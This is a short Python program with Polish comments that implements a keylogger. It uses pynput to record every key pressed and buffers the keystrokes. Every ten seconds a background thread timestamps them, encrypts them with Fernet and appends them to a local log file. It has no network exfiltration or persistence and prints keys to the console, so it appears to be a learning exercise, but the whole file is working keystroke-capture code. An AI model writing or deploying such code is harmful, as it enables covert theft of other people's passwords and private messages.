from pynput import keyboard
from datetime import datetime
import threading
import time
from cryptography.fernet import Fernet


key_buffer = []
lock = threading.Lock() # Blokada


# Załadowanie klucza
def zaladowanie_klucza():
    with open("klucz.key", "rb") as file:
        return file.read()
    

fernet = Fernet(zaladowanie_klucza())


# Szyfrowanie
def szyfrowanie(data: str) -> bytes:
    return fernet.encrypt(data.encode())


def odszyfrowanie(token: bytes) -> str:
    return fernet.decrypt(token).decode()




# Zapisywanie klawiszy
def save_keys():
    while True:
        time.sleep(10)
        # blokada dla wątkow
        with lock:
            if key_buffer: # Jesli sa dane do zapisywania
                    timestamp = datetime.now().strftime("%d/%m/%Y:%H:%M:%S")
                    data = f"{timestamp}: {key_buffer}"
                    zaszyfrowane = szyfrowanie(data)
                    with open("logs.txt", "ab") as file:
                        file.write(zaszyfrowane + b"\n")
                    print(f"Zapisano zaszyfgrowane: {zaszyfrowane}")
                    key_buffer.clear() # Czyszczenie buforu po zapisaniu




# Funkcja śledząca klikanie klawiszy
def on_press(key):
    try:
        with lock:
            key_buffer.append(f"{key.char}")
        print(f"Wcisnieto klawisz {key.char}")
    except AttributeError:
        with lock:
            key_buffer.append(f"{key}")
        print(f"niestandardowy klawisz: {key}")


# Funkcja gdy puścimy klawisz
def on_release(key):
    # Printujemy który klawisz został puszczony
    print(f"Puszczony klawisz: {key}")
    # zakończ nasłuchiwanie jeśli wciśniemy ESC
    if key == keyboard.Key.esc:
        return False


# Watek zapisujacy dane
t1 = threading.Thread(target=save_keys, daemon=True)
t1.start()

# Uruchom
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()